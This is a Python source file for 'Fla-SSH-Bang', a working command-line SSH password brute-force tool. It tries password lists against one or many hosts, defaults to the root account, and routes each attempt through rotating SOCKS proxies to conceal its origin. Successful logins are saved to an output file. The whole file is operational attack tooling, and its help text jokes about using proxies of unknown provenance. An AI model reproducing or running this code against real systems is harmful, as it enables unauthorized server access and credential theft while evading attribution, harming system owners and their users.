from urllib.parse import urlparse
import paramiko.ssh_exception
import paramiko.util
import paramiko
import threading
import argparse
import socket
import socks
import time
import sys
import os

paramiko.util.log_to_file(os.devnull)

class DefaultConfig:
    port = 22
    threads = 10
    threads_multi_hosts = 3
    username = "root"

class Colors:
    RED = "\u001b[31;1m"
    GREEN = "\u001b[32;1m"
    YELLOW = "\u001b[33;1m"
    BLUE = "\u001b[34;1m"
    PURPLE = "\u001b[35;1m"
    CYAN = "\u001b[36;1m"
    RESET = "\u001b[0;0m"

class FlaSSHBang(object):
    active_threads = 0
    kill = False

    def __init__(self, hostname: str, port: int, username: str, passlist: list, proxy_list: list, threads: int, output_file: str = None):
        self.hostname = hostname
        self.port = port
        self.username = username
        self.passlist = passlist
        self.proxy_list = proxy_list
        self.threads = threads
        self.output_file = output_file

        self.attempt_number = 0
        self.host_ip = None

    def get_proxy(self):
        proxy = self.proxy_list.pop(0)
        self.proxy_list.append(proxy)

        return proxy

    def login(self, password: str):
        password_tries = 0
        reattempt = False

        try:
            self.active_threads += 1

            while True:
                if self.kill: return

                proxy = self.get_proxy()
                proxy_url = urlparse(proxy)
                proxy_type = getattr(socks, proxy_url.scheme.upper())

                try:
                    sock = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    sock.set_proxy(proxy_type=proxy_type, addr=proxy_url.hostname, port=proxy_url.port)
                    sock.connect((self.hostname, self.port))

                except Exception:
                    time.sleep(1)
                    continue

                if self.kill: return
                
                print(f"{Colors.BLUE}[{f' ATTEMPT ' if not reattempt else 'REATTEMPT'}]{Colors.RESET} {self.hostname}:{self.port} - {self.username}:{password}")

                try:
                    transport = paramiko.Transport(sock=sock)
                    transport.connect(username=self.username, password=password)

                except paramiko.ssh_exception.AuthenticationException:
                    if self.kill: return
                    self.attempt_number += 1
                    print(f"{Colors.RED}[ FAILED  ]{Colors.RESET} {self.hostname}:{self.port} - {self.username}:{password} - [{self.attempt_number} / {len(self.passlist)}]")
                    return
                
                except paramiko.ssh_exception.BadAuthenticationType:
                    if self.kill: return
                    print(f"{Colors.RED}[  ABORT  ]{Colors.RESET} {self.hostname}:{self.port} does not support password authentication!")
                    self.kill = True
                    return

                except Exception:
                    reattempt = True
                    time.sleep(1)
                    continue

                finally:
                    transport.close()
                
                print(f"{Colors.GREEN}[ SUCCESS ]{Colors.RESET} {Colors.PURPLE}111loggedin!{Colors.RESET} {self.hostname}:{self.port} - {self.username}:{password} {Colors.PURPLE}111loggedin!{Colors.RESET}")
                self.kill = True

                if self.output_file:
                    with open(self.output_file, "a", errors="replace") as file:
                        file.write(f"{self.hostname}:{self.port} - {self.username}:{password}\n")
                        file.close()
                break

        except Exception:
            pass

        finally:
            self.active_threads -= 1
    
    def bang_that_aSSH(self):
        for _ in range(3):
            try:
                self.host_ip = socket.gethostbyname(self.hostname)
                break
            except Exception:
                print(f"{Colors.RED}[ ERROR ]{Colors.RESET} Re-attempting to resolve {self.hostname}.")
                time.sleep(1)
                continue
        
        if not self.host_ip:
            print(f"{Colors.RED}[ ERROR ]{Colors.RESET} Unable to resolve {self.hostname}. Please double check whether it's correct.")
            return

        port_open = False

        for _ in range(3):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((self.host_ip, self.port))
                port_open = True
                break
            except Exception:
                print(f"{Colors.BLUE}[ ERROR ]{Colors.RESET} Unable to connect to {self.hostname} via the port {self.port}, did you make sure it is open?")
                time.sleep(1)
                continue
            
        if not port_open:
            print(f"{Colors.RED}[ ERROR ]{Colors.RESET} The port {self.port} at {self.hostname} seems to be closed.")
        
        for password in self.passlist:
            while True:
                if self.kill:
                    return

                if self.active_threads >= self.threads:
                    time.sleep(0.05)
                    continue

                break

            threading.Thread(target=self.login, args=[password], daemon=True).start()
        
        while True:
            if self.kill or self.active_threads <= 0:
                break

            time.sleep(0.05)

class FlaSSHBangMultiHosts(object):
    active_threads = 0

    def __init__(self, hostnames: list, port: int, username: str, passlist: list, proxy_list: list, threads: int, threads_multi: int, output_file: str = None):
        self.hostnames = hostnames
        self.port = port
        self.username = username
        self.passlist = passlist
        self.proxy_list = proxy_list
        self.threads = threads
        self.threads_multi = threads_multi
        self.output_file = output_file

    def create_flasshbang_instance(self, hostname: str):
        try:
            self.active_threads += 1
            flasshbang = FlaSSHBang(hostname=hostname, port=self.port, username=self.username, passlist=self.passlist, proxy_list=self.proxy_list, threads=self.threads, output_file=self.output_file)
            flasshbang.bang_that_aSSH()
        except Exception:
            pass
        finally:
            self.active_threads -= 1

    def start(self):
        for hostname in self.hostnames:
            while True:
                if self.active_threads >= self.threads_multi:
                    time.sleep(0.05)
                    continue

                break

            threading.Thread(target=self.create_flasshbang_instance, args=[hostname], daemon=True).start()

def clear_console():
    if sys.platform == "win32":
        os.system("cls")
    elif sys.platform in ["linux", "linux2"]:
        os.system("clear")

def show_banner():
    with open("banner.txt", "rb") as file:
        banner = file.read().decode()
        file.close()
    
    terminal_columns = os.get_terminal_size().columns
    max_banner_cols = 0

    for line in banner.splitlines():
        line_columns = len(line)

        if line_columns > max_banner_cols:
            max_banner_cols = line_columns

    spaces = int((terminal_columns - max_banner_cols) / 2)

    print(Colors.PURPLE, end="")
    for line in banner.splitlines():
        print(f"{ ' ' * spaces}{line}")
    print(Colors.RESET)

def main():
    clear_console()
    show_banner()

    parser = argparse.ArgumentParser(description="Fla-SSH-Bang! Inspired by vanhauser's hydra (also shoutout to him for creating that wonderful tool!). Super fast SSH bruteforce tool powered by proxies that who knows where they came from. Written in Python! Number 1 language in the world!")
    parser.add_argument("hostname", type=str, nargs="?", help="Target IP address.")
    parser.add_argument("-p", "--port", type=int, default=DefaultConfig.port, help=f"Target port. Default is set to {DefaultConfig.port}.")
    parser.add_argument("-u", "--username", type=str, default=DefaultConfig.username, help=f"SSH user to attack. The default is set to {DefaultConfig.username}.")
    parser.add_argument("-P", "--passlist", type=argparse.FileType("r"), required=True, help="Your favorite password list from SecLists!")
    parser.add_argument("-pp", "--proxy-list", type=argparse.FileType("r"), required=True, help="Not the size of your penis, but the longer your proxy list is, the better!")
    parser.add_argument("-t", "--threads", type=int, default=DefaultConfig.threads, help=f"Threads, idk how to explain what threads are. But the default is set to {DefaultConfig.threads}! The more threads, the faster!")
    parser.add_argument("-T", "--threads-multi", type=int, default=DefaultConfig.threads_multi_hosts, help=f"Threads for multi hosts. The default is {DefaultConfig.threads_multi_hosts}")
    parser.add_argument("-M", "--host-list", type=argparse.FileType("r"), help="File list of hosts to attack.")
    parser.add_argument("-o", "--output", type=argparse.FileType("a"), help="Success logins output file.")

    args = parser.parse_args()

    if not any([args.hostname, args.host_list]):
        print(f"{Colors.RED}[ ERROR ]{Colors.RESET} Either a single hostname or host_list is required to start the attack.")
        return

    passlist = args.passlist.read().splitlines()
    proxy_list = args.proxy_list.read().splitlines()
    output_file = None

    if args.output:
        output_file = args.output.name

    if args.host_list:
        host_list = args.host_list.read().splitlines()
        
        flasshbang_multi = FlaSSHBangMultiHosts(hostnames=host_list, port=args.port, username=args.username, passlist=passlist, proxy_list=proxy_list, threads=args.threads, threads_multi=args.threads_multi, output_file=output_file)
        flasshbang_multi.start()

    else:
        flasshbang = FlaSSHBang(hostname=args.hostname, port=args.port, username=args.username, passlist=passlist, proxy_list=proxy_list, threads=args.threads, output_file=output_file)
        flasshbang.bang_that_aSSH()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        exit()
